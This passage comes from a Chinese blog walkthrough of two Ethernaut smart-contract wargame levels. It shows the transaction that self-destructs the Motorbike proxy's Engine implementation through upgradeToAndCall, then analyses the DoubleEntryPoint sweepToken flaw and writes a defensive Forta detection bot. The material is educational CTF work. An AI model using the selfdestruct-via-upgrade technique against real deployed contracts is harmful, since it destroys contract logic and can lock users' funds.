- 第二种则是`web3.eth.abi.encodeFunctionCall()`。
![2](https://img-blog.csdnimg.cn/572518ccfa5e4ba08df8f83a359eb75d.png#pic_center)
我们已经得到了`destuct`的`data`数据，我们现在要将其作为`bytes`注入到`upgradeToAndCall`中去，见下图：

![最终data](https://img-blog.csdnimg.cn/988af30a7b5b4cbb8f696cb9b1a9bfa4.png#pic_center)
我们通过`await web3.eth.sendTransaction({from:player,to:engine,data:data2})`进行自毁，成功后`Engine`函数已经完成自毁，存储消失，链上也显示了自毁成功！

![自毁成功1](https://img-blog.csdnimg.cn/1711d901bde94e6abdc47bd68a5d8047.png#pic_center)
![自毁成功2](https://img-blog.csdnimg.cn/e3302a9d587047fbbff383bd23d57256.png#pic_center)
提交实例，本关卡成功！
![关卡成功](https://img-blog.csdnimg.cn/b4bfd5bdcb284e768dd10e84117aab69.png#pic_center)
## 总结
这题其实比较简单，需要注意的其实是怎样找到切入点并构造正确的data。

<hr>

# 26 DoubleEntryPoint
## 创建实例并分析
根据先前的步骤，创建合约实例，其合约地址为`0xb938Cc3cC6c3b97c41628AdEc6d409eEFeb4a824`。本关卡的要求是找到合约的漏洞，并通过`forta`模式进行补救，防止合约通证被清空。

纵观合约，总共有这么几个合约：`Forta`、`CryptoVault`、`LegacyToken`和`DoubleEntryPoint`，此外还有几个接口，分别是`DelegateERC20`、`IDetectionBot`。

我们将分开看看各个合约和接口都分别扮演了怎样的角色：

- DelegateERC20 : 该接口应当实现`delegateTransfer`方法，专门作为被委托通证合约。
- IDetectionBot : 该接口应当实现`handleTransaction`方法，针对传入的`user`和`msgData`变量进行校验，并判断交易是否成行。
- IForta : 该接口应当实现`setDetectionBot`、`notify`以及`raiseAlert`方法，能否辅助通证合约判断当前交易是否有效。
- Forta : 该类实现`IForta`接口，可以看到其模式：
	
	- `SetDetectionBot`用来设置传入的地址为对应发起地址合约的检测bot。
	
	```
  function setDetectionBot(address detectionBotAddress) external override {
      require(address(usersDetectionBots[msg.sender]) == address(0), "DetectionBot already set");
      usersDetectionBots[msg.sender] = IDetectionBot(detectionBotAddress);
  }
	```
	
	- `notify`负责提醒`detectionBot`对交易进行校验。
	
	```
  function notify(address user, bytes calldata msgData) external override {
    if(address(usersDetectionBots[user]) == address(0)) return;
    try usersDetectionBots[user].handleTransaction(user, msgData) {
        return;
    } catch {}
  }
	```
	
	- `raiseAlert`负责接受`detectionBot`传来的警报。

```
  function raiseAlert(address user) external override {
      if(address(usersDetectionBots[user]) != msg.sender) return;
      botRaisedAlerts[msg.sender] += 1;
  } 
```

- CryptoVault（密码金库，笑） : 该合约定义了变量`underlying`，该变量存储不可被交易的通证。同时该合约又定义了`sweepToken`，顾名思义，可以取出合约中所存储的通证（除`underlying`外），个人理解可能是为了保证合约中通证的纯净度。

```
    function setUnderlying(address latestToken) public {
        require(address(underlying) == address(0), "Already set");
        underlying = IERC20(latestToken);
    }

    /*
    ...
    */

    function sweepToken(IERC20 token) public {
        require(token != underlying, "Can't transfer underlying token");
        token.transfer(sweptTokensRecipient, token.balanceOf(address(this)));
    }
```

- LegacyToken（停用通证）： 该合约是停用的通证合约，在设计之初就写死了`transfer`功能，即如果没有委托（即尚未停用），即表现正常，如果存在委托（即已经停用，进行了映射之类的），则转而调用委托合约中的`delegateTransfer`方法。

```
    function transfer(address to, uint256 value) public override returns (bool) {
        if (address(delegate) == address(0)) {
            return super.transfer(to, value);
        } else {
            return delegate.delegateTransfer(to, value, msg.sender);
        }
    }
```

- DoubleEntryPoint (二次进入点？现在理解来看应该是) ：该合约（实际上）实现了`DelegateERC20`的接口，但值得注意的点是其`delegateTransfer`只接受来自父合约（停用通证）的调用，当然该合约受到了`forta`的保护，通过`fortaNotify`这一修饰符实现`forta`的交易前后校验。

```
    function delegateTransfer(
        address to,
        uint256 value,
        address origSender
    ) public override onlyDelegateFrom fortaNotify returns (bool) {
        _transfer(origSender, to, value);
        return true;
    }
```

现在我们就要找找漏洞。根据题目中的提示**the CryptoVault holds 100 units of it. Additionally the CryptoVault also holds 100 of LegacyToken LGT**，也就是说合约既有停用通证，也有委托通证。如果我们在`sweepToken`时试图除去停用通证，停用通证中的`transfer`将会调用委托通证的`delegateTransfer`方法，当两个合约余额相同时，其实也变相完成了侵入。问题就在这里，那么该怎么办呢？

其实我们在`delegateTransfer`时应当检查，不应当是通过`sweepToken`透过`LegacyToken`完成，这就是我们的思路。

## 攻击合约编写

看一下`    function handleTransaction(address user, bytes calldata msgData) external;` 可知传入的`msgData`是破题的关键。`msgData`按照`        forta.notify(player, msg.data);`来说应当是`selector, to, value, origSender`。而这里的`origSender`又是什么呢？其实是`LegacyToken`被调用时的`msg.sender`，后者在漏洞中就是`cryptoVault`，否则将是其他正常地址，我们可以通过这里进行判断，就是看`origSender`是否为`cryptoVault`的地址。

```

pragma solidity ^0.6.0;

interface IForta {
    function setDetectionBot(address detectionBotAddress) external;
    function notify(address user, bytes calldata msgData) external;
    function raiseAlert(address user) external;
}

contract Attacker {

    IForta iforta_ins;
    address cryptoVault;

    constructor(address _addr, address _addr2) public {
        iforta_ins = IForta(_addr);
        cryptoVault = _addr2;
    }

    function handleTransaction(address user, bytes calldata msgData) external {
        address addr;
        uint256 value;
        address origSender;
        (addr,value,origSender) = abi.decode(msgData[4:],(address, uint256, address));
        if (origSender == cryptoVault){
            iforta_ins.raiseAlert(user);
        }
    }

}
```

我们通过`abi.decode`获取到参数，从4开始是为了截取函数选择器，拆分出`addr(to)`、`value`及`origSender`，如果相等，则需要发出警报。（此处比较简单，是因为我觉得`detectionBot`其实在本处应用就一个入口，就是当`delegateTransfer`时唤醒操作，而我想`sweepToken`操作是检测不到的，检测`delegateTransfer`也没有意义）

## 合约交互
现在来看，我们得到的`contract`应该是`DoubleEntryPoint`，地址为`0x85b3686eeEC7092cb36F94566575906ec49767DF`，其`cryptoVault`为`'0x1C21b79f726eF47d923153A6c54eD18d62Ef2881'`，`forta`合约为`'0x8388c030B72e73357FDaFf4f74A24AA7460b5D5e'`。

![查询状态](https://img-blog.csdnimg.cn/07ac49bdb2804af6aa7407dbaa152ae1.png#pic_center)


部署攻击合约，其地址为`0x8388c030B72e73357FDaFf4f74A24AA7460b5D5e`。

![部署攻击合约](https://img-blog.csdnimg.cn/5fef203c3b2e4d1bb31e626cbd5d219f.png#pic_center)


手动通过`await web3.eth.sendTransaction({from:player,to:'0x8388c030B72e73357FDaFf4f74A24AA7460b5D5e',data:data})`设置关联检测机器人。
![设置关联检测机器人](https://img-blog.csdnimg.cn/62659fbae0624a3fa15fb3bb8903f8ad.png#pic_center)
提交实例！本关卡成功！

![关卡成功](https://img-blog.csdnimg.cn/8a6986c7c42640a5b4a4470cd6dc8a44.png#pic_center)
## 总结
这就是观察者模式的变种，你们感觉到了吗？

<hr>

# 总结
很幸运，在长达3个月的持续更新里，我学到了太多东西，希望以后也能持续学习，给大家分享我的所见、所得、所感！